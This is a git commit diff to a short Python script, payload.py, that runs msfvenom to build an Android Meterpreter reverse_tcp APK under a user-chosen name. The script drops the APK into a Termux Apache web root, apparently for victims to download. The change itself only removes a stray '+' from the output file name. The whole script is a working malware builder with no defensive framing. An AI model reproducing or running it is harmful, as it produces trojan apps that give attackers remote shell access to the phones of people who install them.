ef5de6ebeee9aa9afa5a7d7bb4382e4565b1b590
krithikV <45972552+krithikV@users.noreply.github.com>
2021-06-05 18:32:41 +0530

    Update payload.py

--- payload.py
+++ payload.py
@@ -1,3 +1,3 @@
 import os
-cmd = "msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R> /data/data/com.termux/files/usr/share/apache2/default-site/htdocs/{name}+.apk".format(name = input("Enter Payload Name: "))
+cmd = "msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R> /data/data/com.termux/files/usr/share/apache2/default-site/htdocs/{name}.apk".format(name = input("Enter Payload Name: "))
 os.system(cmd)
